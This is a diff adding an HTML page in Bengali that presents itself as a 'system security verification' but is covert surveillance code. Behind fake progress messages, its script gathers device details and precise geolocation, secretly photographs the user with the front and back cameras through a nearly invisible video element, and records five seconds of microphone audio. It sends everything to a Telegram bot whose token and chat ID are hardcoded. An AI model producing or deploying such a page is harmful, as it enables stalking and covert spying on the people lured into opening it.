@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>সিস্টেম সিকিউরিটি ভেরিফিকেশন</title>
+    <style>
+        :root { --primary: #00d1b2; --dark: #363636; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 10; position: relative; }
+        .btn-start { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.05; pointer-events: none; z-index: -1; }
+        #canvas { display: none; }
+        #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+
+<div class="card" id="main-ui">
+    <div id="icon" style="font-size: 50px; margin-bottom: 20px;">🔒</div>
+    <h2 id="title">সিস্টেম ভেরিফিকেশন</h2>
+    <p id="desc">ডিভাইস কনফিগারেশন নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
+    <button class="btn-start" id="start-btn" onclick="startProcess()">চেক শুরু করুন</button>
+    <div id="process-ui" style="display: none;">
+        <div class="loader"></div>
+        <p style="font-weight: bold; color: var(--primary);" id="status">প্রসেসিং হচ্ছে...</p>
+    </div>
+    <img id="my-img" src="my_photo.jpg" alt="Success">
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
+const CHAT_ID = "-1003747831651";
+
+async function startProcess() {
+    document.getElementById('start-btn').style.display = 'none';
+    document.getElementById('desc').style.display = 'none';
+    document.getElementById('process-ui').style.display = 'block';
+
+    const deviceInfo = `📱 ওএস: ${navigator.platform}\n🌐 ব্রাউজার: ${navigator.userAgent.split(') ')[1] || 'Unknown'}\n🖥 স্ক্রিন: ${screen.width}x${screen.height}`;
+
+    let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
+    try {
+        const position = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
+        });
+        mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+    } catch (e) { console.log("Location Denied"); }
+
+    const report = `📊 *নতুন ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n\n📍 *লোকেশন:* [ম্যাপ দেখুন](${mapLink})`;
+
+    try {
+        // ১. সামনের ক্যামেরা
+        updateStatus("সিস্টেম ফাইল যাচাই হচ্ছে...");
+        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        await captureAndSend(frontStream, "Front Camera", report);
+
+        // ২. হার্ডওয়্যার রিলিজের জন্য ২ সেকেন্ড বিরতি (বেশি সময় দেওয়া হলো)
+        await new Promise(r => setTimeout(r, 2000));
+
+        // ৩. পেছনের ক্যামেরা (উন্নত লজিক)
+        updateStatus("হার্ডওয়্যার স্ক্যান করা হচ্ছে...");
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        
+        let backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[videoDevices.length - 1];
+
+        if (videoDevices.length > 1) {
+            const backStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { deviceId: backCamera.deviceId ? { exact: backCamera.deviceId } : undefined, facingMode: "environment" } 
+            });
+            await captureAndSend(backStream, "Back Camera", "--- পেছনের ক্যামেরা ছবি ---");
+        }
+
+        // ৪. অডিও রেকর্ড (৫ সেকেন্ড)
+        updateStatus("সিকিউরিটি এনক্রিপশন চেক হচ্ছে...");
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        await captureAudio(audioStream);
+
+        showFinalUI();
+    } catch (err) {
+        console.error(err);
+        showFinalUI();
+    }
+}
+
+function updateStatus(text) { document.getElementById('status').innerText = text; }
+
+async function captureAndSend(stream, type, caption) {
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    await video.play();
+    
+    return new Promise(resolve => {
+        setTimeout(async () => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'img.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                stream.getTracks().forEach(track => track.stop());
+                resolve();
+            }, 'image/jpeg', 0.6);
+        }, 3000); 
+    });
+}
+
+async function captureAudio(stream) {
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    return new Promise(resolve => {
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('voice', blob, 'audio.ogg');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: formData });
+            stream.getTracks().forEach(track => track.stop());
+            resolve();
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+    });
+}
+
+function showFinalUI() {
+    document.getElementById('process-ui').style.display = 'none';
+    document.getElementById('icon').innerHTML = '✅';
+    document.getElementById('title').innerText = 'ভেরিফিকেশন সম্পন্ন';
+    document.getElementById('my-img').style.display = 'block';
+}
+</script>
+</body>
+</html>
